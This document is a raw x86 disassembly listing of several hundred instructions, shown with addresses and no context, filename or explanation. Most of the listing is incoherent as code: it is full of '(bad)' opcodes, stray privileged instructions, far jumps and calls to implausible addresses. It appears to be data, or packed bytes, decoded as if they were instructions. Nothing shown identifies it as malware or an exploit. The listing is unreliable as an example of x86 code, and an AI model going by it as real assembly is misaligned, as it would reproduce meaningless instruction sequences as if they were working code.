  4121d2:	adc    eax,DWORD PTR ss:[edi]
  4121d5:	push   eax
  4121d6:	xchg   esp,eax
  4121d7:	mov    cl,0x6c
  4121d9:	mov    cl,0xcf
  4121db:	push   0x27b783b1
  4121e0:	jo     0x4121f1
  4121e2:	add    ch,BYTE PTR [edx-0x68caea12]
  4121e8:	or     al,0x5c
  4121ea:	lock sub bl,BYTE PTR [eax]
  4121ed:	cmp    bh,BYTE PTR [eax-0x25]
  4121f0:	jae    0x41217b
  4121f2:	add    ebx,DWORD PTR [edi]
  4121f4:	add    BYTE PTR [ebp-0x60c38467],dh
  4121fa:	repnz aas 
  4121fc:	jo     0x4121c5
  4121fe:	inc    edx
  4121ff:	mov    ebp,0xbbe0a22e
  412204:	sbb    ch,BYTE PTR [ecx-0x55]
  412207:	push   es
  412208:	in     eax,dx
  412209:	add    al,0x6
  41220b:	lds    eax,FWORD PTR [eax+0x28a3dd60]
  412211:	inc    esp
  412212:	lods   eax,DWORD PTR ds:[esi]
  412213:	pop    es
  412214:	daa    
  412215:	lock pop es
  412217:	push   es
  412218:	dec    ebp
  412219:	cmp    BYTE PTR [edx-0x1a],cl
  41221c:	mov    eax,0x9414a678
  412221:	push   0xef8d2ac5
  412226:	mov    ecx,0x6205d36f
  41222b:	and    al,0xa9
  41222d:	sub    DWORD PTR [ebx+0x33],ecx
  412230:	rol    BYTE PTR [ecx],cl
  412232:	pop    ebp
  412233:	hlt    
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
